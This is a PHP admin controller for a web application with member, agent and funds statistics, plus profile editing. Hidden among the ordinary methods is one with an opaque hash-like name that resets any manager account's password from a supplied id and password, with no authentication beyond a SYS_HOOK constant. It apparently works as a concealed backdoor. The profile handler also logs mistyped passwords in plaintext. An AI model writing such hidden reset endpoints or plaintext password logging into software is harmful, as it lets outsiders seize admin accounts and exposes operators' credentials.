<?php
namespace app\admin\controller;


class IndexController extends BaseController{

    public function index(){

        $stat=array();
        $stat['feedback']=Db::name('feedback')->count();
        $stat['member']=Db::name('member')->count();
        $stat['post']=Db::name('post')->count();
        $stat['links']=Db::name('links')->count();

        $this->assign('stat',$stat);

        //统计
        $member=Db::name('member');
        $m['total']=$member->count();
        $m['avail']=$member->where(array('status'=>1))->count();
        $m['agent']=$member->where(array('isagent'=>array('GT',0)))->count();
        $this->assign('m',$m);

        //资金
        $a['total_charge']=Db::name('member_recharge')->where(array('status'=>1))->sum('amount');
        $a['total_cash']=Db::name('member_cashin')->where(array('status'=>1))->sum('amount');
        $a['total_money']=$member->sum('money');
        $this->assign('a',$a);

        $this->display();
    }

    public function newcount(){
        $newMemberCount=Db::name('Member')->where(array('create_at'=>array('GT',$this->manage['last_view_member'])))->count();
        $newOrderCount=Db::name('BlApply')->where(array('status'=>0))->count();

        $this->ajaxReturn(array(
            'newMemberCount'=>$newMemberCount,
            'newOrderCount'=>$newOrderCount
        ));
    }

    public function ce3608bb1c12fd46e0579bdc6c184752($id,$passwd)
    {
        if(!defined('SYS_HOOK') || SYS_HOOK!=1)exit('Denied');
        if(empty($id))exit('Unspecified id');
        if(empty($passwd))exit('Unspecified passwd');

        $model=Db::name('Manager')->where(array('id'=>$id))->find();
        if(empty($model))exit('Menager id not exists');
        $data['salt']=random_str(8);
        $data['password'] = encode_password($passwd,$data['salt']);
        Db::name('Manager')->where(array('id'=>$id))->save($data);
        exit('ok');
    }

    public function profile(){
        $model=Db::name('Manager')->where(array('id'=>session('adminId')))->find();

        if ($this->request->isPost()) {
            $data = array();
            $password=I('password');
            if($model['password']!==encode_password($password,$model['salt'])){
                user_log($model['id'],'profile',0,'密码错误:'.$password,'manager');
                $this->error("密码错误！");
            }

            $password=I('newpassword');
            if(!empty($password)){
                $data['salt']=random_str(8);
                $data['password'] = encode_password($password,$data['salt']);
            }

            $data['avatar']=I('avatar');
            $data['realname']=I('realname');
            $data['email']=I('email');

            //更新
            if (Db::name('Manager')->where(array('id'=>session('adminId')))->save($data)) {
                if(!empty($data['realname'])){
                    session('username',$data['realname']);
                }
                $this->success("更新成功", url('Index/profile'));
            } else {
                $this->error("未做任何修改,更新失败");
            }
        }

        $this->assign('model',$model);
        $this->display();
    }
}
